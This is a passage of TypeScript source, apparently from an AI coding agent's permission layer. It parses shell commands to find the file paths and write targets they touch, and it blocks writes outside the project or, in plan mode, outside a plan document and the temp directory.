  let quote: '"' | "'" | undefined;
  const finishWord = (end: number): void => {
    if (start < 0) return;
    words.push({ value, start, end });
    value = '';
    start = -1;
  };
  const finishStage = (): void => {
    if (words.length > 0) stages.push(words);
    words = [];
  };
  for (let index = 0; index < command.length; index += 1) {
    const char = command[index]!;
    if (quote) {
      if (char === quote) {
        quote = undefined;
      } else if (quote === '"' && char === '\\' && command[index + 1] === '"') {
        value += `${char}${command[index + 1]}`;
        index += 1;
      } else {
        value += char;
      }
      continue;
    }
    if (char === '"' || char === "'") {
      if (start < 0) start = index;
      quote = char;
    } else if (/\s/.test(char)) {
      finishWord(index);
    } else if (char === '|' || char === '&' || char === ';') {
      finishWord(index);
      finishStage();
    } else {
      if (start < 0) start = index;
      value += char;
    }
  }
  if (quote) return [];
  finishWord(command.length);
  finishStage();
  return stages;
}

function maskRawInlineSources(command: string): string {
  // String offsets above are UTF-16 code-unit indexes; split the same way so
  // non-BMP text before a source argument cannot shift the masked range.
  const masked = command.split('');
  for (const words of tokenizeRawCommandStages(command)) {
    const roles = collectCommandArgumentRoles(words.map((word) => word.value));
    for (const index of roles.sourceIndexes) {
      const word = words[index];
      if (!word) continue;
      for (let offset = word.start; offset < word.end; offset += 1) masked[offset] = ' ';
    }
  }
  return masked.join('');
}

function legacyRegexPathScan(command: string): string[] {
  const out: string[] = [];

  let m: RegExpExecArray | null;
  // Preserve quoted Windows paths with spaces without recovering arbitrary
  // quoted source/regex fragments as paths.
  for (const pattern of [/"([A-Za-z]:\\[^"\r\n]+)"/g, /'([A-Za-z]:\\[^'\r\n]+)'/g]) {
    while ((m = pattern.exec(command)) !== null) {
      out.push(m[1]!);
    }
  }

  // Common path patterns (mirrors pre-AST `pathPattern` exactly so we
  // preserve identification of `./foo`, `../foo`, `C:\foo`, `~/foo`,
  // `.x/foo`)
  const pathPattern = /(?:^|\s)(\.\.?\/[^\s]+|\.\.?\\[^\s]+|~\/[^\s]+|\.[^\s]*[/\\][^\s]*)/g;
  while ((m = pathPattern.exec(command)) !== null) {
    out.push(m[1]!);
  }
  // Raw Windows paths need a wider left boundary for attached path options
  // such as `findstr /G:C:\patterns.txt`; inline source ranges were masked
  // before this pass, so matching after `=` or `:` cannot recover code text.
  const windowsPathPattern = /(?:^|[\s:=<>])([a-zA-Z]:\\[^\s"'|;&<>]+)/g;
  while ((m = windowsPathPattern.exec(command)) !== null) {
    out.push(m[1]!);
  }
  return out;
}

/**
 * Extract potential file paths from a bash command. Used to check whether
 * a bash invocation operates on protected paths (`isCommandOnProtectedPath`)
 * and as a "wide net" feeder into `collectBashWriteTargets`.
 *
 * FEATURE_152 (v0.7.38): hybrid AST + legacy-regex pass:
 *   1. AST tokenisation for argv — gives correctly unquoted paths,
 *      including paths with spaces (`"path with spaces.txt"`). Pre-AST
 *      regex needed quotes literally present in input.
 *   2. Legacy regex pass for Windows backslash paths — shell-quote treats
 *      `\` as POSIX escape so `C:\Users\foo` mangles into `C:Users`.
 *      The regex recognises the raw Windows path token before tokenisation.
 *
 * Both passes contribute; results de-duplicate via `Set` at the call site.
 *
 * Issue 052: original purpose — gate "always allow" on bash commands that
 * touch protected paths.
 */
export function extractPathsFromCommand(command: string): string[] {
  const paths = new Set<string>();

  // Pass 1: AST-based argv + redirection targets (handles quoted-with-spaces)
  const tree = parseBashCommand(command);
  if (!tree.unparseable) {
    for (const stmt of tree.statements) {
      for (const stage of stmt.stages) {
        const roles = collectCommandArgumentRoles(stage.argv);
        for (const value of roles.pathValues) paths.add(value);
        for (let index = 0; index < stage.argv.length; index += 1) {
          const token = stage.argv[index]!;
          if (roles.sourceIndexes.has(index) || roles.pathIndexes.has(index)) continue;
          if (looksLikePath(token)) paths.add(token);
        }
        for (const redir of stage.redirections) {
          if (looksLikePath(redir.target)) paths.add(redir.target);
        }
      }
    }
  }

  // Pass 2: legacy regex pass (handles Windows backslash paths shell-quote
  // can't tokenise). Always run — even on parseable input — because the
  // two passes recognise different forms.
  for (const p of legacyRegexPathScan(maskRawInlineSources(command))) {
    paths.add(p);
  }

  return Array.from(paths);
}

/**
 * Check if a bash command operates on any protected paths
 * Issue 052: Prevent "always" option for bash commands on protected paths
 */
export function isCommandOnProtectedPath(
  command: string,
  projectRoot: string,
  executionCwd = projectRoot,
): boolean {
  const paths = extractPathsFromCommand(command);
  for (const p of paths) {
    const resolved = resolveExecutionPath(p, executionCwd);
    if (isAlwaysConfirmPath(resolved, projectRoot)) {
      return true;
    }
  }
  return false;
}

function normalizePathForComparison(targetPath: string): string {
  const normalized = path.normalize(targetPath);
  return process.platform === 'win32' ? normalized.toLowerCase() : normalized;
}

function pathsEqual(leftPath: string, rightPath: string): boolean {
  return normalizePathForComparison(leftPath) === normalizePathForComparison(rightPath);
}

/**
 * Check whether a path stays inside the project root after resolution.
 */
export function isPathInsideProject(targetPath: string, projectRoot: string): boolean {
  try {
    const resolvedRoot = path.resolve(projectRoot);
    const resolvedTarget = path.resolve(
      resolvedRoot,
      expandSystemTempAlias(expandHomeDirectory(targetPath)),
    );
    return isPathInsideDirectory(resolvedTarget, resolvedRoot);
  } catch {
    return false;
  }
}

function collectAbsolutePathCandidates(command: string): string[] {
  const matches = command.match(/[A-Za-z]:[\\/][^\s;|&<>(){}'"]+|\/[^\s;|&<>(){}'"]+/g);
  if (!matches) {
    return [];
  }

  return matches.filter(match => !/^(?:\/dev\/|\/proc\/)/i.test(match));
}

function resolveExistingPathPrefix(targetPath: string): string {
  const resolved = path.resolve(targetPath);
  const cached = existingPathPrefixCache.get(resolved);
  if (cached) {
    return cached;
  }

  if (fs.existsSync(resolved)) {
    const realPath = fs.realpathSync.native(resolved);
    existingPathPrefixCache.set(resolved, realPath);
    return realPath;
  }

  const segments: string[] = [];
  let current = resolved;

  while (!fs.existsSync(current)) {
    const parent = path.dirname(current);
    if (parent === current) {
      existingPathPrefixCache.set(resolved, resolved);
      return resolved;
    }
    segments.unshift(path.basename(current));
    current = parent;
  }

  const resolvedPrefix = fs.realpathSync.native(current);
  const fullPath = path.join(resolvedPrefix, ...segments);
  existingPathPrefixCache.set(resolved, fullPath);
  return fullPath;
}

function expandHomeDirectory(targetPath: string): string {
  if (targetPath === '~') {
    return os.homedir();
  }
  if (targetPath.startsWith(`~${path.sep}`) || targetPath.startsWith('~/') || targetPath.startsWith('~\\')) {
    return path.join(os.homedir(), targetPath.slice(2));
  }
  return targetPath;
}

function expandSystemTempAlias(targetPath: string): string {
  const tempDir = os.tmpdir();
  const patterns: Array<[RegExp, string]> = [
    [/^%temp%/i, tempDir],
    [/^%tmp%/i, tempDir],
    [/^\$env:temp\b/i, tempDir],
    [/^\$env:tmp\b/i, tempDir],
    [/^\$tmpdir\b/i, tempDir],
    [/^\$temp\b/i, tempDir],
    [/^\$tmp\b/i, tempDir],
  ];

  for (const [pattern, replacement] of patterns) {
    if (pattern.test(targetPath)) {
      return targetPath.replace(pattern, replacement);
    }
  }

  return targetPath;
}

function resolvePermissionPath(
  targetPath: string,
  projectRoot?: string,
  executionCwd = projectRoot,
): string {
  const baseRoot = path.resolve(executionCwd ?? projectRoot ?? process.cwd());
  const expanded = expandSystemTempAlias(expandHomeDirectory(targetPath));
  const resolved = path.isAbsolute(expanded)
    ? path.resolve(expanded)
    : path.resolve(baseRoot, expanded);
  return resolveExistingPathPrefix(resolved);
}

function getSystemTempDirectories(): string[] {
  if (cachedSystemTempDirectories) {
    return cachedSystemTempDirectories;
  }

  const tempDirs = new Set<string>();
  const candidates = [os.tmpdir(), process.env.TEMP, process.env.TMP, process.env.TMPDIR]
    .filter((value): value is string => typeof value === 'string' && value.trim().length > 0);

  for (const candidate of candidates) {
    try {
      tempDirs.add(resolveExistingPathPrefix(candidate));
    } catch {
      // Ignore malformed temp env values and fall back to the OS default temp dir.
    }
  }

  cachedSystemTempDirectories = Array.from(tempDirs);
  return cachedSystemTempDirectories;
}

export function getPlanModeAllowedWritablePaths(projectRoot?: string): {
  projectPlanDoc: string;
  systemTempDirs: string[];
} {
  const resolvedRoot = resolveExistingPathPrefix(projectRoot ?? process.cwd());
  return {
    projectPlanDoc: path.join(resolvedRoot, PLAN_MODE_PROJECT_DOC_RELATIVE_PATH),
    systemTempDirs: getSystemTempDirectories(),
  };
}

export function isPlanModeAllowedPath(
  targetPath: string,
  projectRoot?: string,
  executionCwd = projectRoot,
): boolean {
  const resolvedTarget = resolvePermissionPath(targetPath, projectRoot, executionCwd);
  const { projectPlanDoc, systemTempDirs } = getPlanModeAllowedWritablePaths(projectRoot);

  if (pathsEqual(resolvedTarget, projectPlanDoc)) {
    return true;
  }

  return systemTempDirs.some(tempDir => isPathInsideDirectory(resolvedTarget, tempDir));
}

function formatPlanModeAllowedLocations(projectRoot?: string): string {
  const { projectPlanDoc, systemTempDirs } = getPlanModeAllowedWritablePaths(projectRoot);
  const tempSummary = systemTempDirs[0] ?? os.tmpdir();
  return `${projectPlanDoc} or the system temp directory (${tempSummary})`;
}

/**
 * Subcommand verbs in `tee` that take a file as the next positional arg.
 * Empty for `tee` itself — its only flag we care about is `-a` (append),
 * which doesn't change which token is the target. Listed for symmetry
 * with future expansion.
 */
const TEE_FLAGS_TAKING_NO_VALUE = new Set(['-a', '--append', '-i', '--ignore-interrupts']);

/**
 * From a stage whose `argv[0]` is `tee` (case-insensitive), return the
 * positional target file(s). Skips known boolean flags; takes the first
 * non-flag positional after them. Multiple targets technically supported
 * by tee — we collect all of them.
 */
function collectTeeTargets(stage: { readonly argv: readonly string[] }): string[] {
  const targets: string[] = [];
  for (let i = 1; i < stage.argv.length; i += 1) {
    const tok = stage.argv[i]!;
    if (TEE_FLAGS_TAKING_NO_VALUE.has(tok)) continue;
    if (tok.startsWith('-')) continue; // unknown flag — skip to be safe
    targets.push(tok);
  }
  return targets;
}

function collectPowerShellWriteTargets(stage: { readonly argv: readonly string[] }): string[] {
  const analysis = analyzePowerShellMutation(stage.argv);
  const targets: string[] = [];
  for (const operation of analysis.operations) {
    if ('target' in operation) targets.push(operation.target);
    else if (operation.kind === 'copy') targets.push(operation.destination);
    else targets.push(operation.source, operation.destination);
  }
  return targets;
}

/**
 * Collect the file targets that a bash command might write to. Used by
 * plan-mode (`getPlanModeBlockReason`) and `getBashOutsideProjectWriteRisk`.
 *
 * FEATURE_152 (v0.7.38): backed by `parseBashCommand` AST. The pre-AST
 * version concatenated four overlapping regex sweeps over the raw command
 * string — each had its own substring-vs-token pitfalls (e.g. `tee`
 * matched as substring in `committee.txt`). The AST gives clean argv
 * tokens with quoting stripped, and per-stage redirection targets.
 */
export function collectBashWriteTargets(command: string): string[] {
  return collectBashWriteTargetsAtDepth(command, 0, true);
}

/** Parsed targets whose command role itself proves they are mutated. */
export function collectDeterministicBashWriteTargets(command: string): string[] {
  return collectBashWriteTargetsAtDepth(command, 0, false);
}

const MUTATE_ALL_POSITIONAL_COMMANDS = new Set([
  'rm', 'rmdir', 'mkdir', 'touch', 'mv', 'move', 'ren', 'del', 'erase', 'rd',
]);
const DESTINATION_ONLY_COMMANDS = new Set(['cp', 'copy']);

const CMD_MUTATION_SWITCHES: Readonly<Record<string, ReadonlySet<string>>> = {
  copy: new Set(['/a', '/b', '/d', '/j', '/l', '/n', '/v', '/y', '/-y', '/z']),
  del: new Set(['/p', '/f', '/s', '/q', '/a']),
  erase: new Set(['/p', '/f', '/s', '/q', '/a']),
  move: new Set(['/y', '/-y']),
  rd: new Set(['/s', '/q']),
  rmdir: new Set(['/s', '/q']),
};

function isCmdMutationSwitch(command: string, token: string): boolean {
  const normalized = token.toLowerCase();
  const base = normalized.slice(0, normalized.indexOf(':') >= 0
    ? normalized.indexOf(':')
    : normalized.length);
  return CMD_MUTATION_SWITCHES[command]?.has(base) === true;
}

function collectPositionalArgs(
  command: string,
  argv: readonly string[],
  startIndex = 1,
): string[] {
  const positional: string[] = [];
  let optionsEnded = false;
  for (let index = startIndex; index < argv.length; index += 1) {
    const token = argv[index]!;
    if (token === '--') {
      optionsEnded = true;
    } else if (optionsEnded || (!token.startsWith('-') && !isCmdMutationSwitch(command, token))) {
      positional.push(token);
    }
  }
  return positional;
}

function collectDirectCommandWriteTargets(stage: { readonly argv: readonly string[] }): string[] {
  const command = commandBasename(stage.argv[0] ?? '');
  const positional = collectPositionalArgs(command, stage.argv);
  if (MUTATE_ALL_POSITIONAL_COMMANDS.has(command)) return positional;
  if (DESTINATION_ONLY_COMMANDS.has(command)) {
    const targetDirectoryIndex = stage.argv.findIndex((token) => (
      token === '-t' || token === '--target-directory'
    ));
    if (targetDirectoryIndex >= 0) {
      const targetDirectory = stage.argv[targetDirectoryIndex + 1];
      return targetDirectory ? [targetDirectory] : [];
    }
    const attachedTarget = stage.argv.find((token) => token.startsWith('--target-directory='));
    return attachedTarget ? [attachedTarget.slice('--target-directory='.length)] : positional.slice(-1);
  }
  if (command === 'chmod' || command === 'chown') return positional.slice(1);
  if (command === 'dd') {
    const output = stage.argv.find((token) => token.startsWith('of='));
    return output ? [output.slice(3)] : [];
  }
  return [];
}

function collectRawOutputRedirectionTargets(command: string): string[] {
  const targets: string[] = [];
  const masked = maskRawInlineSources(command);
  let quote: '"' | "'" | undefined;
  for (let index = 0; index < masked.length; index += 1) {
    const char = masked[index]!;
    if (quote !== undefined) {
      if (char === quote) quote = undefined;
      else if (char === '\\' && quote === '"') index += 1;
      continue;
    }
    if (char === '"' || char === "'") {
      quote = char;
      continue;
    }
    if (char === '\\') {
      index += 1;
      continue;
    }
    if (char !== '>') continue;
    if (masked[index + 1] === '>') index += 1;
    while (/\s/.test(masked[index + 1] ?? '')) index += 1;
    const targetQuote = masked[index + 1];
    const start = index + (targetQuote === '"' || targetQuote === "'" ? 2 : 1);
    let end = start;
    while (end < masked.length) {
      const targetChar = masked[end]!;
      if (targetQuote === '"' || targetQuote === "'") {
        if (targetChar === targetQuote) break;
      } else if (/\s|[|;&<>]/.test(targetChar)) {
        break;
      }
      end += 1;
    }
    if (end > start) targets.push(masked.slice(start, end));
    index = end;
  }
  return targets;
}

function collectBashWriteTargetsAtDepth(
  command: string,
  depth: number,
  includeHeuristicPaths: boolean,
): string[] {
  const targets = new Set<string>();
  const pushTarget = (value: string | undefined): void => {
    const trimmed = value?.trim();
    if (trimmed) targets.add(trimmed);
  };

  // 1. Heuristic path tokens (covers e.g. `cp src.ts dst.ts` where neither
  //    arg is a redirection but both name files). Pre-AST version included
  //    this via `extractPathsFromCommand`; preserved for compat.
  if (includeHeuristicPaths) {
    for (const extractedPath of extractPathsFromCommand(command)) {
      pushTarget(extractedPath);
    }
  } else {
    for (const target of collectRawOutputRedirectionTargets(command)) {
      pushTarget(target);
    }
  }

  const tree = parseBashCommand(command);
  if (tree.unparseable) {
    // A shell payload can contain syntax deliberately rejected by the AST
    // (notably backticks) while still exposing a deterministic redirect.
    // Recover only recognized shell-command roles; arbitrary quoted Python,
    // regex, and data arguments remain opaque.
    if (depth < 3) {
      for (const words of tokenizeRawCommandStages(command)) {
        const nested = getNestedShellCommand(words.map((word) => word.value));
        if (nested === undefined) continue;
        for (const target of collectBashWriteTargetsAtDepth(
          nested,
          depth + 1,
          includeHeuristicPaths,
        )) {
          pushTarget(target);
        }
      }
    }
    return Array.from(targets);
  }

  for (const stmt of tree.statements) {
    for (const stage of stmt.stages) {
      // 2. Redirection targets — output redirects only; input redirects
      //    don't write. Null-device redirects ARE included so plan-mode
      //    won't mistake `echo hi 2>NUL > /tmp/out` for "no targets".
      for (const redir of stage.redirections) {
        if (redir.input) continue;
        pushTarget(redir.target);
      }

      // 3. Stage-command-specific writes
      const cmd = stage.argv[0]?.toLowerCase();
      if (!cmd) continue;
      if (cmd === 'tee') {
        for (const t of collectTeeTargets(stage)) pushTarget(t);
      } else if (POWERSHELL_WRITE_TOKENS.has(cmd)) {
        for (const t of collectPowerShellWriteTargets(stage)) pushTarget(t);
      }
      if (!includeHeuristicPaths) {
        for (const target of collectDirectCommandWriteTargets(stage)) pushTarget(target);
      }

      const nested = depth < 3 ? getNestedShellCommand(stage.argv) : undefined;
      if (nested !== undefined) {
        for (const target of collectBashWriteTargetsAtDepth(
          nested,
          depth + 1,
          includeHeuristicPaths,
        )) {
          pushTarget(target);
        }
      }
    }
  }

  return Array.from(targets);
}

export function getBashOutsideProjectWriteRisk(
  command: string,
  projectRoot: string
): { dangerous: boolean; reason?: string } {
  if (!isBashWriteCommand(command)) {
    return { dangerous: false };
  }

  const targets = new Set<string>([
    ...collectBashWriteTargets(command),
    ...collectAbsolutePathCandidates(command),
  ]);

  for (const targetPath of targets) {
    if (!isPathInsideProject(targetPath, projectRoot)) {
      return {
        dangerous: true,
        reason: `Command may modify file outside project: ${targetPath}`,
      };
    }
  }

  return { dangerous: false };
}

/**
 * v0.7.42 — Metadata-driven plan-mode gate.
 *
 * Decision order (first match wins):
 *
 *   1. Tool has `planModeAllowed: true` in its `LocalToolDefinition` →
 *      permitted (`null`). Covers planning-loop tools whose effect IS the
 *      planning workflow: `exit_plan_mode`, `task_stop`, `todo_*`,
 *      `ask_user_question`, plus read-class network queries
 *      (`web_search`, `mcp_search` / `mcp_describe` /
 *      `mcp_read_resource` / `mcp_get_prompt`).
 *   2. Tool has `sideEffect === 'readonly'` AND not explicitly disallowed →
 *      permitted (`null`). Read tools never need plan-mode gating.
 *   3. Path-aware FS-write escape: tools in `FILE_MODIFICATION_TOOLS`
 *      (computed from `sideEffect === 'mutates-fs' AND requires path`)
 *      can write IF the target path is `.agent/plan_mode_doc.md` or the
 *      system temp dir.
 *   4. `bash` special case: command-content-aware check via
 *      `isBashWriteCommand` + `collectBashWriteTargets` — read-only bash
 *      (`git status`, `ls`, …) is permitted; write bash with all targets
 *      in the plan-doc / temp escape is permitted; everything else
 *      blocks.
 *   5. Everything else with a side effect → blocked with a generic
 *      reason naming the side-effect class.
 *
 * Pre-v0.7.42 this function only gated `write`, `edit`, `undo`, `bash` —
 * a hardcoded 4-tool list that silently let `multi_edit`,
 * `insert_after_anchor`, `worktree_*`, `scaffold_*`, `stage_*`,
 * `dispatch_child_task`, `send_message`, `web_fetch`, `mcp_call` etc.
 * fall through to `return null` (permitted). The metadata-driven gate
 * closes that gap structurally — new mutating tools auto-block until
 * explicitly opted in via `planModeAllowed: true`.
 */
export function getPlanModeBlockReason(
  toolName: string,
  input: Record<string, unknown>,
  projectRoot?: string,
  executionCwd = projectRoot,
): string | null {
  const allowedLocations = formatPlanModeAllowedLocations(projectRoot);

  // (1) + (2): metadata says this tool is permitted in plan mode. Covers
  // read-only tools (no `planModeAllowed` flag needed) and explicitly
  // plan-allowed mutating tools.
  if (isToolPlanModeAllowed(toolName)) {
    return null;
  }

  // (3) Path-aware FS-write escape. Tools in this set declare a `path`
  // input and mutate the filesystem; permit when the path is the
  // project plan doc or the system temp dir.
  if (FILE_MODIFICATION_TOOLS.has(toolName)) {
    const targetPath = typeof input.path === 'string' ? input.path : '';
    if (!targetPath) {
      return `[Blocked] Tool '${toolName}' is not allowed in plan mode unless it targets ${allowedLocations}.`;
    }

    if (isPlanModeAllowedPath(targetPath, projectRoot, executionCwd)) {
      return null;
    }

    return `[Blocked] Plan mode only allows file modifications in ${allowedLocations}. Requested path: ${targetPath}`;
  }

  // (4) bash: command-content-aware check (read-only commands permitted).
  if (toolName === 'bash') {
    const command = (input.command as string) ?? '';
    if (!isBashWriteCommand(command)) {
      return null;
    }

    const targets = collectBashWriteTargets(command);
    if (targets.length === 0) {
      return `[Blocked] Plan mode only allows bash write operations when every target is either ${allowedLocations}. Could not determine a safe target from: ${command.slice(0, 80)}${command.length > 80 ? '...' : ''}`;
    }

    const blockedTarget = targets.find(target => (
      !isPlanModeAllowedPath(target, projectRoot, executionCwd)
    ));
    if (!blockedTarget) {
      return null;
    }

    return `[Blocked] Plan mode only allows bash write operations in ${allowedLocations}. Blocked target: ${blockedTarget}`;
  }

  // (5) Generic block for any other tool whose sideEffect declares a
  // mutation. Reaches here only for tools that:
  //   - are NOT planModeAllowed: true
  //   - are NOT sideEffect: 'readonly'
  //   - are NOT in FILE_MODIFICATION_TOOLS (path-aware)
  //   - are NOT 'bash' (command-aware)
  // i.e. `undo`, `worktree_*`, `dispatch_child_task`, `send_message`,
  // `web_fetch`, `mcp_call`, constructed-tool staircase, etc.
  return `[Blocked] Tool '${toolName}' has side effects and is not permitted in plan mode. Switch to accept-edits or auto mode to use it, or work within ${allowedLocations}.`;
}

// ============== Mode Inference ==============

/**
 * Infer PermissionMode from legacy options (backward compat)
 */
export function inferPermissionMode(opts: {
  auto?: boolean;
  mode?: 'code' | 'ask';
  confirmTools?: Set<string>;
}): PermissionMode {
  if (opts.mode === 'ask') return 'plan';
  if (opts.auto) return 'auto-in-project';
  if (opts.confirmTools && opts.confirmTools.size === 0) return 'auto-in-project';
  if (opts.confirmTools && !opts.confirmTools.has('write') && !opts.confirmTools.has('edit')) {
    return 'accept-edits';
  }
  return 'accept-edits';
}

// Re-export constants for convenience
export { MODIFICATION_TOOLS, FILE_MODIFICATION_TOOLS } from './types.js';
